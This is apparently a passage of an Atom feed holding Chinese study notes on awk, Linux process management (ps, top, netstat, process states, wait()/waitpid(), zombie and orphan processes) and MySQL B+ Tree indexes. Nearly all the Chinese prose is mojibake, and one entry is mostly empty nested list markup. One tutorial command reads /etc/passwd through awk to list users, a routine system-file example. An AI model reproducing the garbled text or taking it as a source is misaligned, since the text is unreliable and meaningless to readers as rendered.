</code></pre></div><p>å¯ä»¥æ ¹æ®å­—æ®µçš„æŸäº›æ¡ä»¶è¿›è¡ŒåŒ¹é…ï¼Œä¾‹å¦‚åŒ¹é…å­—æ®µå°äºæŸä¸ªå€¼çš„é‚£ä¸€è¡Œæ•°æ®ã€‚</p>
<div><pre><code>$ awk 'æ¡ä»¶ç±»å‹ 1 {åŠ¨ä½œ 1} æ¡ä»¶ç±»å‹ 2 {åŠ¨ä½œ 2} ...' filename
</code></pre></div><p>ç¤ºä¾‹ï¼š/etc/passwd æ–‡ä»¶ç¬¬ä¸‰ä¸ªå­—æ®µä¸º UIDï¼Œå¯¹ UID å°äº 10 çš„æ•°æ®è¿›è¡Œå¤„ç†ã€‚</p>
<div><pre><code>$ cat /etc/passwd | awk 'BEGIN {FS=":"} $3 &lt; 10 {print $1 "\t " $3}'
root 0
bin 1
daemon 2
</code></pre></div><p>awk å˜é‡ï¼š</p>
<table>
<thead>
<tr>
<th style="text-align:center">å˜é‡åç§°</th>
<th>ä»£è¡¨æ„ä¹‰</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">NF</td>
<td>æ¯ä¸€è¡Œæ‹¥æœ‰çš„å­—æ®µæ€»æ•°</td>
</tr>
<tr>
<td style="text-align:center">NR</td>
<td>ç›®å‰æ‰€å¤„ç†çš„æ˜¯ç¬¬å‡ è¡Œæ•°æ®</td>
</tr>
<tr>
<td style="text-align:center">FS</td>
<td>ç›®å‰çš„åˆ†éš”å­—ç¬¦ï¼Œé»˜è®¤æ˜¯ç©ºæ ¼é”®</td>
</tr>
</tbody>
</table>
<p>ç¤ºä¾‹ï¼šæ˜¾ç¤ºæ­£åœ¨å¤„ç†çš„è¡Œå·ä»¥åŠæ¯ä¸€è¡Œæœ‰å¤šå°‘å­—æ®µ</p>
<div><pre><code>$ last -n 5 | awk '{print $1 "\t lines: " NR "\t columns: " NF}'
dmtsai lines: 1 columns: 10
dmtsai lines: 2 columns: 10
dmtsai lines: 3 columns: 10
dmtsai lines: 4 columns: 10
dmtsai lines: 5 columns: 9
</code></pre></div><h1 id="åã€è¿›ç¨‹ç®¡ç†" tabindex="-1"> åã€è¿›ç¨‹ç®¡ç†</h1>
<h2 id="æŸ¥çœ‹è¿›ç¨‹" tabindex="-1"> æŸ¥çœ‹è¿›ç¨‹</h2>
<h3 id="_1-ps" tabindex="-1"> 1. ps</h3>
<p>æŸ¥çœ‹æŸä¸ªæ—¶é—´ç‚¹çš„è¿›ç¨‹ä¿¡æ¯ã€‚</p>
<p>ç¤ºä¾‹ä¸€ï¼šæŸ¥çœ‹è‡ªå·±çš„è¿›ç¨‹</p>
<div><pre><code><span># ps -l</span>
</code></pre></div><p>ç¤ºä¾‹äºŒï¼šæŸ¥çœ‹ç³»ç»Ÿæ‰€æœ‰è¿›ç¨‹</p>
<div><pre><code><span># ps aux</span>
</code></pre></div><p>ç¤ºä¾‹ä¸‰ï¼šæŸ¥çœ‹ç‰¹å®šçš„è¿›ç¨‹</p>
<div><pre><code><span># ps aux | grep threadx</span>
</code></pre></div><h3 id="_2-pstree" tabindex="-1"> 2. pstree</h3>
<p>æŸ¥çœ‹è¿›ç¨‹æ ‘ã€‚</p>
<p>ç¤ºä¾‹ï¼šæŸ¥çœ‹æ‰€æœ‰è¿›ç¨‹æ ‘</p>
<div><pre><code><span># pstree -A</span>
</code></pre></div><h3 id="_3-top" tabindex="-1"> 3. top</h3>
<p>å®æ—¶æ˜¾ç¤ºè¿›ç¨‹ä¿¡æ¯ã€‚</p>
<p>ç¤ºä¾‹ï¼šä¸¤ç§’é’Ÿåˆ·æ–°ä¸€æ¬¡</p>
<div><pre><code><span># top -d 2</span>
</code></pre></div><h3 id="_4-netstat" tabindex="-1"> 4. netstat</h3>
<p>æŸ¥çœ‹å ç”¨ç«¯å£çš„è¿›ç¨‹</p>
<p>ç¤ºä¾‹ï¼šæŸ¥çœ‹ç‰¹å®šç«¯å£çš„è¿›ç¨‹</p>
<div><pre><code><span># netstat -anp | grep port</span>
</code></pre></div><h2 id="è¿›ç¨‹çŠ¶æ€" tabindex="-1"> è¿›ç¨‹çŠ¶æ€</h2>
<table>
<thead>
<tr>
<th style="text-align:center">çŠ¶æ€</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">R</td>
<td>running or runnable (on run queue)<br>æ­£åœ¨æ‰§è¡Œæˆ–è€…å¯æ‰§è¡Œï¼Œæ­¤æ—¶è¿›ç¨‹ä½äºæ‰§è¡Œé˜Ÿåˆ—ä¸­ã€‚</td>
</tr>
<tr>
<td style="text-align:center">D</td>
<td>uninterruptible sleep (usually I/O)<br>ä¸å¯ä¸­æ–­é˜»å¡ï¼Œé€šå¸¸ä¸º IO é˜»å¡ã€‚</td>
</tr>
<tr>
<td style="text-align:center">S</td>
<td>interruptible sleep (waiting for an event to complete) <br> å¯ä¸­æ–­é˜»å¡ï¼Œæ­¤æ—¶è¿›ç¨‹æ­£åœ¨ç­‰å¾…æŸä¸ªäº‹ä»¶å®Œæˆã€‚</td>
</tr>
<tr>
<td style="text-align:center">Z</td>
<td>zombie (terminated but not reaped by its parent)<br>åƒµæ­»ï¼Œè¿›ç¨‹å·²ç»ç»ˆæ­¢ä½†æ˜¯å°šæœªè¢«å…¶çˆ¶è¿›ç¨‹è·å–ä¿¡æ¯ã€‚</td>
</tr>
<tr>
<td style="text-align:center">T</td>
<td>stopped (either by a job control signal or because it is being traced) <br> ç»“æŸï¼Œè¿›ç¨‹æ—¢å¯ä»¥è¢«ä½œä¸šæ§åˆ¶ä¿¡å·ç»“æŸï¼Œä¹Ÿå¯èƒ½æ˜¯æ­£åœ¨è¢«è¿½è¸ªã€‚</td>
</tr>
<tr>
<td style="text-align:center"><br></td>
<td></td>
</tr>
</tbody>
</table>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/2bab4127-3e7d-48cc-914e-436be859fb05.png" width="490px"/> </div><br>
<h2 id="sigchld" tabindex="-1"> SIGCHLD</h2>
<p>å½“ä¸€ä¸ªå­è¿›ç¨‹æ”¹å˜äº†å®ƒçš„çŠ¶æ€æ—¶ï¼ˆåœæ­¢è¿è¡Œï¼Œç»§ç»­è¿è¡Œæˆ–è€…é€€å‡ºï¼‰ï¼Œæœ‰ä¸¤ä»¶äº‹ä¼šå‘ç”Ÿåœ¨çˆ¶è¿›ç¨‹ä¸­ï¼š</p>
<ul>
<li>å¾—åˆ° SIGCHLD ä¿¡å·ï¼›</li>
<li>waitpid() æˆ–è€… wait() è°ƒç”¨ä¼šè¿”å›ã€‚</li>
</ul>
<p>å…¶ä¸­å­è¿›ç¨‹å‘é€çš„ SIGCHLD ä¿¡å·åŒ…å«äº†å­è¿›ç¨‹çš„ä¿¡æ¯ï¼Œæ¯”å¦‚è¿›ç¨‹ IDã€è¿›ç¨‹çŠ¶æ€ã€è¿›ç¨‹ä½¿ç”¨ CPU çš„æ—¶é—´ç­‰ã€‚</p>
<p>åœ¨å­è¿›ç¨‹é€€å‡ºæ—¶ï¼Œå®ƒçš„è¿›ç¨‹æè¿°ç¬¦ä¸ä¼šç«‹å³é‡Šæ”¾ï¼Œè¿™æ˜¯ä¸ºäº†è®©çˆ¶è¿›ç¨‹å¾—åˆ°å­è¿›ç¨‹ä¿¡æ¯ï¼Œçˆ¶è¿›ç¨‹é€šè¿‡ wait() å’Œ waitpid() æ¥è·å¾—ä¸€ä¸ªå·²ç»é€€å‡ºçš„å­è¿›ç¨‹çš„ä¿¡æ¯ã€‚</p>
<div align="center">  </div><br>
<h2 id="wait" tabindex="-1"> wait()</h2>
<div><pre><code><span>pid_t</span> <span>wait</span><span>(</span><span>int</span> <span>*</span>status<span>)</span>
</code></pre></div><p>çˆ¶è¿›ç¨‹è°ƒç”¨ wait() ä¼šä¸€ç›´é˜»å¡ï¼Œç›´åˆ°æ”¶åˆ°ä¸€ä¸ªå­è¿›ç¨‹é€€å‡ºçš„ SIGCHLD ä¿¡å·ï¼Œä¹‹å wait() å‡½æ•°ä¼šé”€æ¯å­è¿›ç¨‹å¹¶è¿”å›ã€‚</p>
<p>å¦‚æœæˆåŠŸï¼Œè¿”å›è¢«æ”¶é›†çš„å­è¿›ç¨‹çš„è¿›ç¨‹ IDï¼›å¦‚æœè°ƒç”¨è¿›ç¨‹æ²¡æœ‰å­è¿›ç¨‹ï¼Œè°ƒç”¨å°±ä¼šå¤±è´¥ï¼Œæ­¤æ—¶è¿”å› -1ï¼ŒåŒæ—¶ errno è¢«ç½®ä¸º ECHILDã€‚</p>
<p>å‚æ•° status ç”¨æ¥ä¿å­˜è¢«æ”¶é›†çš„å­è¿›ç¨‹é€€å‡ºæ—¶çš„ä¸€äº›çŠ¶æ€ï¼Œå¦‚æœå¯¹è¿™ä¸ªå­è¿›ç¨‹æ˜¯å¦‚ä½•æ­»æ‰çš„æ¯«ä¸åœ¨æ„ï¼Œåªæƒ³æŠŠè¿™ä¸ªå­è¿›ç¨‹æ¶ˆç­æ‰ï¼Œå¯ä»¥è®¾ç½®è¿™ä¸ªå‚æ•°ä¸º NULLã€‚</p>
<h2 id="waitpid" tabindex="-1"> waitpid()</h2>
<div><pre><code><span>pid_t</span> <span>waitpid</span><span>(</span><span>pid_t</span> pid<span>,</span> <span>int</span> <span>*</span>status<span>,</span> <span>int</span> options<span>)</span>
</code></pre></div><p>ä½œç”¨å’Œ wait() å®Œå…¨ç›¸åŒï¼Œä½†æ˜¯å¤šäº†ä¸¤ä¸ªå¯ç”±ç”¨æˆ·æ§åˆ¶çš„å‚æ•° pid å’Œ optionsã€‚</p>
<p>pid å‚æ•°æŒ‡ç¤ºä¸€ä¸ªå­è¿›ç¨‹çš„ IDï¼Œè¡¨ç¤ºåªå…³å¿ƒè¿™ä¸ªå­è¿›ç¨‹é€€å‡ºçš„ SIGCHLD ä¿¡å·ã€‚å¦‚æœ pid=-1 æ—¶ï¼Œé‚£ä¹ˆå’Œ wait() ä½œç”¨ç›¸åŒï¼Œéƒ½æ˜¯å…³å¿ƒæ‰€æœ‰å­è¿›ç¨‹é€€å‡ºçš„ SIGCHLD ä¿¡å·ã€‚</p>
<p>options å‚æ•°ä¸»è¦æœ‰ WNOHANG å’Œ WUNTRACED ä¸¤ä¸ªé€‰é¡¹ï¼ŒWNOHANG å¯ä»¥ä½¿ waitpid() è°ƒç”¨å˜æˆéé˜»å¡çš„ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒä¼šç«‹å³è¿”å›ï¼Œçˆ¶è¿›ç¨‹å¯ä»¥ç»§ç»­æ‰§è¡Œå…¶å®ƒä»»åŠ¡ã€‚</p>
<h2 id="å­¤å„¿è¿›ç¨‹" tabindex="-1"> å­¤å„¿è¿›ç¨‹</h2>
<p>ä¸€ä¸ªçˆ¶è¿›ç¨‹é€€å‡ºï¼Œè€Œå®ƒçš„ä¸€ä¸ªæˆ–å¤šä¸ªå­è¿›ç¨‹è¿˜åœ¨è¿è¡Œï¼Œé‚£ä¹ˆè¿™äº›å­è¿›ç¨‹å°†æˆä¸ºå­¤å„¿è¿›ç¨‹ã€‚</p>
<p>å­¤å„¿è¿›ç¨‹å°†è¢« init è¿›ç¨‹ï¼ˆè¿›ç¨‹å·ä¸º 1ï¼‰æ‰€æ”¶å…»ï¼Œå¹¶ç”± init è¿›ç¨‹å¯¹å®ƒä»¬å®ŒæˆçŠ¶æ€æ”¶é›†å·¥ä½œã€‚</p>
<p>ç”±äºå­¤å„¿è¿›ç¨‹ä¼šè¢« init è¿›ç¨‹æ”¶å…»ï¼Œæ‰€ä»¥å­¤å„¿è¿›ç¨‹ä¸ä¼šå¯¹ç³»ç»Ÿé€ æˆå±å®³ã€‚</p>
<h2 id="åƒµå°¸è¿›ç¨‹" tabindex="-1"> åƒµå°¸è¿›ç¨‹</h2>
<p>ä¸€ä¸ªå­è¿›ç¨‹çš„è¿›ç¨‹æè¿°ç¬¦åœ¨å­è¿›ç¨‹é€€å‡ºæ—¶ä¸ä¼šé‡Šæ”¾ï¼Œåªæœ‰å½“çˆ¶è¿›ç¨‹é€šè¿‡ wait() æˆ– waitpid() è·å–äº†å­è¿›ç¨‹ä¿¡æ¯åæ‰ä¼šé‡Šæ”¾ã€‚å¦‚æœå­è¿›ç¨‹é€€å‡ºï¼Œè€Œçˆ¶è¿›ç¨‹å¹¶æ²¡æœ‰è°ƒç”¨ wait() æˆ– waitpid()ï¼Œé‚£ä¹ˆå­è¿›ç¨‹çš„è¿›ç¨‹æè¿°ç¬¦ä»ç„¶ä¿å­˜åœ¨ç³»ç»Ÿä¸­ï¼Œè¿™ç§è¿›ç¨‹ç§°ä¹‹ä¸ºåƒµå°¸è¿›ç¨‹ã€‚</p>
<p>åƒµå°¸è¿›ç¨‹é€šè¿‡ ps å‘½ä»¤æ˜¾ç¤ºå‡ºæ¥çš„çŠ¶æ€ä¸º Zï¼ˆzombieï¼‰ã€‚</p>
<p>ç³»ç»Ÿæ‰€èƒ½ä½¿ç”¨çš„è¿›ç¨‹å·æ˜¯æœ‰é™çš„ï¼Œå¦‚æœäº§ç”Ÿå¤§é‡åƒµå°¸è¿›ç¨‹ï¼Œå°†å› ä¸ºæ²¡æœ‰å¯ç”¨çš„è¿›ç¨‹å·è€Œå¯¼è‡´ç³»ç»Ÿä¸èƒ½äº§ç”Ÿæ–°çš„è¿›ç¨‹ã€‚</p>
<p>è¦æ¶ˆç­ç³»ç»Ÿä¸­å¤§é‡çš„åƒµå°¸è¿›ç¨‹ï¼Œåªéœ€è¦å°†å…¶çˆ¶è¿›ç¨‹æ€æ­»ï¼Œæ­¤æ—¶åƒµå°¸è¿›ç¨‹å°±ä¼šå˜æˆå­¤å„¿è¿›ç¨‹ï¼Œä»è€Œè¢« init è¿›ç¨‹æ‰€æ”¶å…»ï¼Œè¿™æ · init è¿›ç¨‹å°±ä¼šé‡Šæ”¾æ‰€æœ‰çš„åƒµå°¸è¿›ç¨‹æ‰€å æœ‰çš„èµ„æºï¼Œä»è€Œç»“æŸåƒµå°¸è¿›ç¨‹ã€‚</p>
<h1 id="å‚è€ƒèµ„æ–™" tabindex="-1"> å‚è€ƒèµ„æ–™</h1>
<ul>
<li>é¸Ÿå“¥. é¸Ÿ å“¥ çš„ Linux ç§ æˆ¿ èœ åŸº ç¡€ ç¯‡ ç¬¬ ä¸‰ ç‰ˆ[J]. 2009.</li>
<li><a href="https://www.ibm.com/developerworks/cn/linux/l-cn-rpmdpkg/index.html" target="_blank" rel="noopener noreferrer">Linux å¹³å°ä¸Šçš„è½¯ä»¶åŒ…ç®¡ç†</a></li>
<li><a href="http://liubigbin.github.io/2016/03/11/Linux-%E4%B9%8B%E5%AE%88%E6%8A%A4%E8%BF%9B%E7%A8%8B%E3%80%81%E5%83%B5%E6%AD%BB%E8%BF%9B%E7%A8%8B%E4%B8%8E%E5%AD%A4%E5%84%BF%E8%BF%9B%E7%A8%8B/" target="_blank" rel="noopener noreferrer">Linux ä¹‹å®ˆæŠ¤è¿›ç¨‹ã€åƒµæ­»è¿›ç¨‹ä¸å­¤å„¿è¿›ç¨‹</a></li>
<li><a href="https://stackoverflow.com/questions/185899/what-is-the-difference-between-a-symbolic-link-and-a-hard-link" target="_blank" rel="noopener noreferrer">What is the difference between a symbolic link and a hard link?</a></li>
<li><a href="https://idea.popcount.org/2012-12-11-linux-process-states/" target="_blank" rel="noopener noreferrer">Linux process states</a></li>
<li><a href="https://en.wikipedia.org/wiki/GUID_Partition_Table" target="_blank" rel="noopener noreferrer">GUID Partition Table</a></li>
<li><a href="https://blog.csdn.net/kevinhg/article/details/7001719" target="_blank" rel="noopener noreferrer">è¯¦è§£ wait å’Œ waitpid å‡½æ•°</a></li>
<li><a href="https://blog.csdn.net/tianlesoftware/article/details/6009110" target="_blank" rel="noopener noreferrer">IDEã€SATAã€SCSIã€SASã€FCã€SSD ç¡¬ç›˜ç±»å‹ä»‹ç»</a></li>
<li><a href="http://www.mpchunter.com/s3000/akai-ib-301s-scsi-interface-for-s2800s3000/" target="_blank" rel="noopener noreferrer">Akai IB-301S SCSI Interface for S2800,S3000</a></li>
<li><a href="https://en.wikipedia.org/wiki/Parallel_ATA" target="_blank" rel="noopener noreferrer">Parallel ATA</a></li>
<li><a href="http://www.thessdreview.com/our-reviews/adata-xpg-sx900-256gb-sata-3-ssd-review-expanded-capacity-and-sandforce-driven-speed/4/" target="_blank" rel="noopener noreferrer">ADATA XPG SX900 256GB SATA 3 SSD Review â€“ Expanded Capacity and SandForce Driven Speed</a></li>
<li><a href="https://blogs.cisco.com/datacenter/decoding-ucs-invicta-part-1" target="_blank" rel="noopener noreferrer">Decoding UCS Invicta â€“ Part 1</a></li>
<li><a href="https://zh.wikipedia.org/wiki/%E7%A1%AC%E7%9B%98" target="_blank" rel="noopener noreferrer">ç¡¬ç›˜</a></li>
<li><a href="http://www.differencebetween.info/difference-between-sas-and-sata" target="_blank" rel="noopener noreferrer">Difference between SAS and SATA</a></li>
<li><a href="https://zh.wikipedia.org/wiki/BIOS" target="_blank" rel="noopener noreferrer">BIOS</a></li>
<li><a href="https://www.cs.rutgers.edu/~pxk/416/notes/13-fs-studies.html" target="_blank" rel="noopener noreferrer">File system design case studies</a></li>
<li><a href="https://classes.soe.ucsc.edu/cmps111/Fall08/proj4.shtml" target="_blank" rel="noopener noreferrer">Programming Project #4</a></li>
<li><a href="http://web.cs.ucla.edu/classes/fall14/cs111/scribe/11a/index.html" target="_blank" rel="noopener noreferrer">FILE SYSTEM DESIGN</a></li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">æ“ä½œç³»ç»Ÿ</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">ä¸€ã€ç´¢å¼•</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%95%B0%E6%8D%AE%E5%BA%93/MySQL.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%95%B0%E6%8D%AE%E5%BA%93/MySQL.html"/>
    <updated>2022-05-16T11:59:04.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>

<h1 id="ä¸€ã€ç´¢å¼•" tabindex="-1"> ä¸€ã€ç´¢å¼•</h1>
<h2 id="b-tree-åŸç†" tabindex="-1"> B+ Tree åŸç†</h2>
<h3 id="_1-æ•°æ®ç»“æ„" tabindex="-1"> 1. æ•°æ®ç»“æ„</h3>
<p>B Tree æŒ‡çš„æ˜¯ Balance Treeï¼Œä¹Ÿå°±æ˜¯å¹³è¡¡æ ‘ã€‚å¹³è¡¡æ ‘æ˜¯ä¸€é¢—æŸ¥æ‰¾æ ‘ï¼Œå¹¶ä¸”æ‰€æœ‰å¶å­èŠ‚ç‚¹ä½äºåŒä¸€å±‚ã€‚</p>
<p>B+ Tree æ˜¯åŸºäº B Tree å’Œå¶å­èŠ‚ç‚¹é¡ºåºè®¿é—®æŒ‡é’ˆè¿›è¡Œå®ç°ï¼Œå®ƒå…·æœ‰ B Tree çš„å¹³è¡¡æ€§ï¼Œå¹¶ä¸”é€šè¿‡é¡ºåºè®¿é—®æŒ‡é’ˆæ¥æé«˜åŒºé—´æŸ¥è¯¢çš„æ€§èƒ½ã€‚</p>
<p>åœ¨ B+ Tree ä¸­ï¼Œä¸€ä¸ªèŠ‚ç‚¹ä¸­çš„ key ä»å·¦åˆ°å³éé€’å‡æ’åˆ—ï¼Œå¦‚æœæŸä¸ªæŒ‡é’ˆçš„å·¦å³ç›¸é‚» key åˆ†åˆ«æ˜¯ key<sub>i</sub> å’Œ key<sub>i+1</sub>ï¼Œä¸”ä¸ä¸º nullï¼Œåˆ™è¯¥æŒ‡é’ˆæŒ‡å‘èŠ‚ç‚¹çš„æ‰€æœ‰ key å¤§äºç­‰äº key<sub>i</sub> ä¸”å°äºç­‰äº key<sub>i+1</sub>ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/33576849-9275-47bb-ada7-8ded5f5e7c73.png" width="350px"> </div><br>
<h3 id="_2-æ“ä½œ" tabindex="-1"> 2. æ“ä½œ</h3>
<p>è¿›è¡ŒæŸ¥æ‰¾æ“ä½œæ—¶ï¼Œé¦–å…ˆåœ¨æ ¹èŠ‚ç‚¹è¿›è¡ŒäºŒåˆ†æŸ¥æ‰¾ï¼Œæ‰¾åˆ°ä¸€ä¸ª key æ‰€åœ¨çš„æŒ‡é’ˆï¼Œç„¶åé€’å½’åœ°åœ¨æŒ‡é’ˆæ‰€æŒ‡å‘çš„èŠ‚ç‚¹è¿›è¡ŒæŸ¥æ‰¾ã€‚ç›´åˆ°æŸ¥æ‰¾åˆ°å¶å­èŠ‚ç‚¹ï¼Œç„¶ååœ¨å¶å­èŠ‚ç‚¹ä¸Šè¿›è¡ŒäºŒåˆ†æŸ¥æ‰¾ï¼Œæ‰¾å‡º key æ‰€å¯¹åº”çš„ dataã€‚</p>
<p>æ’å…¥åˆ é™¤æ“ä½œä¼šç ´åå¹³è¡¡æ ‘çš„å¹³è¡¡æ€§ï¼Œå› æ­¤åœ¨æ’å…¥åˆ é™¤æ“ä½œä¹‹åï¼Œéœ€è¦å¯¹æ ‘è¿›è¡Œä¸€ä¸ªåˆ†è£‚ã€åˆå¹¶ã€æ—‹è½¬ç­‰æ“ä½œæ¥ç»´æŠ¤å¹³è¡¡æ€§ã€‚</p>
<h3 id="_3-ä¸çº¢é»‘æ ‘çš„æ¯”è¾ƒ" tabindex="-1"> 3. ä¸çº¢é»‘æ ‘çš„æ¯”è¾ƒ</h3>
<p>çº¢é»‘æ ‘ç­‰å¹³è¡¡æ ‘ä¹Ÿå¯ä»¥ç”¨æ¥å®ç°ç´¢å¼•ï¼Œä½†æ˜¯æ–‡ä»¶ç³»ç»ŸåŠæ•°æ®åº“ç³»ç»Ÿæ™®éé‡‡ç”¨ B+ Tree ä½œä¸ºç´¢å¼•ç»“æ„ï¼Œä¸»è¦æœ‰ä»¥ä¸‹ä¸¤ä¸ªåŸå› ï¼š</p>
<p>ï¼ˆä¸€ï¼‰æ›´å°‘çš„æŸ¥æ‰¾æ¬¡æ•°</p>
<p>å¹³è¡¡æ ‘æŸ¥æ‰¾æ“ä½œçš„æ—¶é—´å¤æ‚åº¦å’Œæ ‘é«˜ h ç›¸å…³ï¼ŒO(h)=O(log<sub>d</sub>N)ï¼Œå…¶ä¸­ d ä¸ºæ¯ä¸ªèŠ‚ç‚¹çš„å‡ºåº¦ã€‚</p>
<p>çº¢é»‘æ ‘çš„å‡ºåº¦ä¸º 2ï¼Œè€Œ B+ Tree çš„å‡ºåº¦ä¸€èˆ¬éƒ½éå¸¸å¤§ï¼Œæ‰€ä»¥çº¢é»‘æ ‘çš„æ ‘é«˜ h å¾ˆæ˜æ˜¾æ¯” B+ Tree å¤§éå¸¸å¤šï¼ŒæŸ¥æ‰¾çš„æ¬¡æ•°ä¹Ÿå°±æ›´å¤šã€‚</p>
<p>ï¼ˆäºŒï¼‰åˆ©ç”¨ç£ç›˜é¢„è¯»ç‰¹æ€§</p>
<p>ä¸ºäº†å‡å°‘ç£ç›˜ I/O æ“ä½œï¼Œç£ç›˜å¾€å¾€ä¸æ˜¯ä¸¥æ ¼æŒ‰éœ€è¯»å–ï¼Œè€Œæ˜¯æ¯æ¬¡éƒ½ä¼šé¢„è¯»ã€‚é¢„è¯»è¿‡ç¨‹ä¸­ï¼Œç£ç›˜è¿›è¡Œé¡ºåºè¯»å–ï¼Œé¡ºåºè¯»å–ä¸éœ€è¦è¿›è¡Œç£ç›˜å¯»é“ï¼Œå¹¶ä¸”åªéœ€è¦å¾ˆçŸ­çš„ç£ç›˜æ—‹è½¬æ—¶é—´ï¼Œé€Ÿåº¦ä¼šéå¸¸å¿«ã€‚</p>
<p>æ“ä½œç³»ç»Ÿä¸€èˆ¬å°†å†…å­˜å’Œç£ç›˜åˆ†å‰²æˆå›ºå®šå¤§å°çš„å—ï¼Œæ¯ä¸€å—ç§°ä¸ºä¸€é¡µï¼Œå†…å­˜ä¸ç£ç›˜ä»¥é¡µä¸ºå•ä½äº¤æ¢æ•°æ®ã€‚æ•°æ®åº“ç³»ç»Ÿå°†ç´¢å¼•çš„ä¸€ä¸ªèŠ‚ç‚¹çš„å¤§å°è®¾ç½®ä¸ºé¡µçš„å¤§å°ï¼Œä½¿å¾—ä¸€æ¬¡ I/O å°±èƒ½å®Œå…¨è½½å…¥ä¸€ä¸ªèŠ‚ç‚¹ã€‚å¹¶ä¸”å¯ä»¥åˆ©ç”¨é¢„è¯»ç‰¹æ€§ï¼Œç›¸é‚»çš„èŠ‚ç‚¹ä¹Ÿèƒ½å¤Ÿè¢«é¢„å…ˆè½½å…¥ã€‚</p>
<h2 id="mysql-ç´¢å¼•" tabindex="-1"> MySQL ç´¢å¼•</h2>
<p>ç´¢å¼•æ˜¯åœ¨å­˜å‚¨å¼•æ“å±‚å®ç°çš„ï¼Œè€Œä¸æ˜¯åœ¨æœåŠ¡å™¨å±‚å®ç°çš„ï¼Œæ‰€ä»¥ä¸åŒå­˜å‚¨å¼•æ“å…·æœ‰ä¸åŒçš„ç´¢å¼•ç±»å‹å’Œå®ç°ã€‚</p>
<h3 id="_1-b-tree-ç´¢å¼•" tabindex="-1"> 1. B+Tree ç´¢å¼•</h3>
<p>æ˜¯å¤§å¤šæ•° MySQL å­˜å‚¨å¼•æ“çš„é»˜è®¤ç´¢å¼•ç±»å‹ã€‚</p>
<p>å› ä¸ºä¸å†éœ€è¦è¿›è¡Œå…¨è¡¨æ‰«æï¼Œåªéœ€è¦å¯¹æ ‘è¿›è¡Œæœç´¢å³å¯ï¼Œæ‰€ä»¥æŸ¥æ‰¾é€Ÿåº¦å¿«å¾ˆå¤šã€‚</p>
<p>å› ä¸º B+ Tree çš„æœ‰åºæ€§ï¼Œæ‰€ä»¥é™¤äº†ç”¨äºæŸ¥æ‰¾ï¼Œè¿˜å¯ä»¥ç”¨äºæ’åºå’Œåˆ†ç»„ã€‚</p>
<p>å¯ä»¥æŒ‡å®šå¤šä¸ªåˆ—ä½œä¸ºç´¢å¼•åˆ—ï¼Œå¤šä¸ªç´¢å¼•åˆ—å…±åŒç»„æˆé”®ã€‚</p>
<p>é€‚ç”¨äºå…¨é”®å€¼ã€é”®å€¼èŒƒå›´å’Œé”®å‰ç¼€æŸ¥æ‰¾ï¼Œå…¶ä¸­é”®å‰ç¼€æŸ¥æ‰¾åªé€‚ç”¨äºæœ€å·¦å‰ç¼€æŸ¥æ‰¾ã€‚å¦‚æœä¸æ˜¯æŒ‰ç…§ç´¢å¼•åˆ—çš„é¡ºåºè¿›è¡ŒæŸ¥æ‰¾ï¼Œåˆ™æ— æ³•ä½¿ç”¨ç´¢å¼•ã€‚</p>
<p>InnoDB çš„ B+Tree ç´¢å¼•åˆ†ä¸ºä¸»ç´¢å¼•å’Œè¾…åŠ©ç´¢å¼•ã€‚ä¸»ç´¢å¼•çš„å¶å­èŠ‚ç‚¹ data åŸŸè®°å½•ç€å®Œæ•´çš„æ•°æ®è®°å½•ï¼Œè¿™ç§ç´¢å¼•æ–¹å¼è¢«ç§°ä¸ºèšç°‡ç´¢å¼•ã€‚å› ä¸ºæ— æ³•æŠŠæ•°æ®è¡Œå­˜æ”¾åœ¨ä¸¤ä¸ªä¸åŒçš„åœ°æ–¹ï¼Œæ‰€ä»¥ä¸€ä¸ªè¡¨åªèƒ½æœ‰ä¸€ä¸ªèšç°‡ç´¢å¼•ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/45016e98-6879-4709-8569-262b2d6d60b9.png" width="350px"> </div><br>
<p>è¾…åŠ©ç´¢å¼•çš„å¶å­èŠ‚ç‚¹çš„ data åŸŸè®°å½•ç€ä¸»é”®çš„å€¼ï¼Œå› æ­¤åœ¨ä½¿ç”¨è¾…åŠ©ç´¢å¼•è¿›è¡ŒæŸ¥æ‰¾æ—¶ï¼Œéœ€è¦å…ˆæŸ¥æ‰¾åˆ°ä¸»é”®å€¼ï¼Œç„¶åå†åˆ°ä¸»ç´¢å¼•ä¸­è¿›è¡ŒæŸ¥æ‰¾ã€‚</p>
